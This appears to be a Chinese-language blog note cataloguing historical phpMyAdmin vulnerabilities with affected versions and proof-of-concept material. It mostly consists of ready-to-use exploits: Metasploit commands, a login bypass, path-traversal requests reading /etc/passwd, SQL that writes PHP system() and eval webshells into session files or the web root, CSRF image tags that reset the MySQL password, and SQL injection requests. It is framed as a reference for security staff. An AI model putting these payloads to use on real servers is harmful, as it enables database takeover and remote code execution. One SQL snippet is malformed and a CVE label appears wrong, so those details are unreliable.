---
title: "PhpMyAdmin 漏洞汇总"
date: "2025-04-01 17:17:26"
updated: "2026-05-30 19:25:50"
categories: ["文章", "学习笔记"]
tags: ["phpMyAdmin"]
thumbnail: "http://目标地址/sql.php?db=mysql&table=user&sql_query=SET%20password%20=%20PASSWORD(%27恶意密码%27)"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "562"
---
<h4>phpMyAdmin 作为一款广泛使用的 MySQL 数据库 Web 管理工具，其安全性直接关系到数据库乃至服务器的安全。本文梳理了 phpMyAdmin 历史上影响较大的漏洞，包括漏洞原理、影响版本、POC（漏洞证明代码）及利用方式，为安全从业者和运维人员提供参考。</h4>
<h4 class="md-end-block md-heading md-focus"><span class="md-plain md-expand">一、万能密码与弱口令</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 2.11.3~2.11.9.2</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">2.11.9.2 版本：用户名输入</span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain">，密码留空，直接登录；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">2.11.3/4 版本：用户名输入</span><span class="md-pair-s" spellcheck="false"><code>&#039;localhost&#039;@&#039;@&quot;</code></span><span class="md-plain">（英文标点），密码任意（或留空）。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：无需正确密码，直接登录 phpMyAdmin 后台，获取数据库管理权限。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">二、远程代码执行（RCE）</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">1. CVE-2009-1151</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 2.11.x < 2.11.9.5、3.x < 3.1.3.1</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：通过 Metasploit 模块利用</span></p>



```bash
msfconsole  
use exploit/unix/webapp/phpmyadmin_config  
set RHOSTS 目标IP  
set RPORT 目标端口  
exploit
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：通过模块触发配置文件漏洞，执行任意系统命令或获取反向 Shell。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">2. CVE-2012-5159</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 3.5.2.2</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：通过 Metasploit 模块利用</span></p>



```bash
msfconsole  
use exploit/multi/http/phpmyadmin3522_backdoor  
set RHOSTS 目标IP  
exploit
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：利用</span><span class="md-pair-s" spellcheck="false"><code>server_sync.php</code></span><span class="md-plain">文件包含漏洞，执行 PHP 代码，获取服务器权限。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">3. CVE-2013-3238</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 3.5.x < 3.5.8.1、4.0.0 < 4.0.0-rc3</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：通过 Metasploit 模块利用</span></p>



```bash
msfconsole  
use exploit/multi/http/phpmyadminpregreplace  
set RHOSTS 目标IP  
exploit
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：滥用</span><span class="md-pair-s" spellcheck="false"><code>preg_replace()</code></span><span class="md-plain">函数的</span><span class="md-pair-s" spellcheck="false"><code>/e</code></span><span class="md-plain">修饰符，将替换字符串解析为 PHP 代码执行。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">4. CVE-2016-5734</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">phpMyAdmin 4.0.x < 4.0.10.16、4.4.x < 4.4.15.7、4.6.x < 4.6.3；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">仅支持 PHP 4.3.0~5.4.6（PHP 5.4.7 + 修复空字节问题，不可利用）。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：Python 脚本（需登录权限）</span><span class="md-link md-pair-s" spellcheck="false"><a href="https://www.exploit-db.com/exploits/40185">https://www.exploit-db.com/exploits/40185</a></span></p>



```bash
python3 cve-2016-5734.py -u 用户名 -p 密码 http://目标地址 -c "要执行的命令（如system('id')）"
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：登录后创建含特殊名称的表，通过</span><span class="md-pair-s" spellcheck="false"><code>tbl_find_replace.php</code></span><span class="md-plain">构造替换语句，将命令注入为 PHP 代码执行。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">三、文件包含漏洞</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">1. CVE-2014-8959（本地文件包含）</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 4.0.1~4.2.12，且 PHP 版本 < 5.3.4</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：构造 GET 请求包含本地文件</span></p>



```http
GET /gis_data_editor.php?token=获取的token值&gis_data[gis_type]=/../../../../../../../../目标文件路径%00 HTTP/1.1  
Host: 目标地址
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：通过</span><span class="md-pair-s" spellcheck="false"><code>%00</code></span><span class="md-plain">截断路径，包含服务器本地文件（如配置文件、日志文件），若文件含 PHP 代码可执行。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">2. CVE-2018-12613（本地文件包含）</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 4.8.0、4.8.0.1、4.8.1</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">读取系统文件（如</span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain">）：</span></p>



```http
GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">包含 Session 文件（需登录，获取</span><span class="md-pair-s" spellcheck="false"><code>PHPSESSID</code></span><span class="md-plain">）：</span></p>



```http
GET /index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_<PHPSESSID> HTTP/1.1
```


</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">登录后执行</span><span class="md-pair-s" spellcheck="false"><code>SELECT &#039;&lt;?=system($_GET[cmd])?&gt;&#039;</code></span><span class="md-plain">，将 PHP 代码写入 Session 文件；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问包含 Session 文件的 URL，通过</span><span class="md-pair-s" spellcheck="false"><code>?cmd=命令</code></span><span class="md-plain">触发代码执行。</span></p>
</li>
</ol>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">3. CVE-2018-19968（任意文件包含 / RCE）</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 4.8.0~4.8.3</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建数据库和表并插入 PHP 代码：</span></p>



```sql
CREATE DATABASE foo;
CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );
INSERT INTO foo.bar SELECT ‘<?php phpinfo(); ?>’;
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">但此时还没有在数据库 foo 中生成 phpmyadmin 的配置表，访问：</span></p>



```
http://测试地址/chk_rel.php?fixall_pmadb=1&db=fo
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">生成配置表后，篡改数据指向 Session 文件：</span></p>



```http
INSERT INTO` pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', ' plop', 'plop','../../../../../../../../tmp/sess_[session]','plop';
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问包含Session文件的地址：</span></p>



```
http://测试地址/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[ multi_edit][][]=baz&clause_is_unique=1
```


</li>
</ol>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：通过数据库操作写入恶意代码到 Session 文件，再利用文件包含漏洞执行代码。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">四、任意文件读取</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">WooYun-2016-199433</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 2.x 版本</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：构造 POST 请求读取文件</span></p>



```http
POST /scripts/setup.php HTTP/1.1  
Host: 目标地址  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 长度值  
​
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:目标文件路径长度:"目标文件路径";}  
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```


<p class="md-end-block md-p"><span class="md-plain">示例（读取</span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain">）：</span></p>



```http
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：通过反序列化</span><span class="md-pair-s" spellcheck="false"><code>PMA_Config</code></span><span class="md-plain">对象，控制</span><span class="md-pair-s" spellcheck="false"><code>source</code></span><span class="md-plain">参数读取服务器任意文件（如</span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain">、数据库配置文件）。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">五、跨站请求伪造（CSRF）</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">1. CVE-2017-1000499</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 4.7.0 Beta1、4.7.0 Rc1、4.7.4、4.7.5、4.7.6</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">添加测试服务器：访问</span><span class="md-pair-s" spellcheck="false"><code>http://目标地址/phpMyAdmin/setup/index.php</code></span><span class="md-plain">，新建服务器（如名称 “test”，主机名 “localhost”），记录该服务器的序号（如</span><span class="md-pair-s" spellcheck="false"><code>id=1</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">抓取删除请求：手动删除上述服务器，通过抓包工具获取请求 URL：</span></p>



```
GET /phpMyAdmin/setup/index.php?page=servers&mode=remove&id=1 HTTP/1.1  
Host: 目标地址  
Cookie: 管理员登录后的会话Cookie
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">构造并触发恶意页面,诱导管理员访问该页面：</span></p>



```html
<!-- 示例：修改管理员密码 -->  
<img src="http://目标地址/sql.php?db=mysql&table=user&sql_query=SET%20password%20=%20PASSWORD(%27恶意密码%27)" style="display:none;">  
​
<!-- 示例：写入Webshell（需MySQL写权限） -->  
<img src="http://目标地址/sql.php?db=test&sql_query=SELECT '<?php eval($_GET[1]);?>' INTO OUTFILE '/var/www/html/shell.php'" style="display:none;">
```


</li>
</ol>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：诱骗已登录的管理员访问含恶意标签的页面，执行敏感操作（改密码、写后门等）。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">2. CVE-2019-12922</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin <= 4.9.0.1</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：构造修改配置的恶意 URL</span></p>



```html
<img src="http://目标地址/prefs_manage.php?db=&table=&token=管理员token&action=save&cfg[Servers][1][AllowRoot]=true" style="display:none;">
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：通过 CSRF 漏洞篡改 phpMyAdmin 配置（如允许 root 登录），或执行其他未授权操作。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">六、SQL 注入</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">CVE-2020-0554（后台 SQL 注入）</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响版本</span></strong></span><span class="md-plain">：phpMyAdmin 4 < 4.9.4、5 < 5.0.1（需已知用户名密码登录后台）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">POC</span></strong></span><span class="md-plain">：构造含注入的 GET 请求（替换</span><span class="md-pair-s" spellcheck="false"><code>token</code></span><span class="md-plain">为登录后获取的值）</span></p>



```http
GET /server_privileges.php?ajax_request=true&validate_username=1&username=1%27and%20extractvalue(1,concat(0x7e,(select%20version()),0x7e))--+db=&token=登录后的token&viewing_mode=server HTTP/1.1  
Host: 目标地址  
Cookie: 登录后的Cookie
```


</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：登录后台后，通过</span><span class="md-pair-s" spellcheck="false"><code>username</code></span><span class="md-plain md-expand">参数注入 SQL 语句，利用报错注入获取数据库信息（版本、用户、数据等）。</span></p>
</li>
</ul>
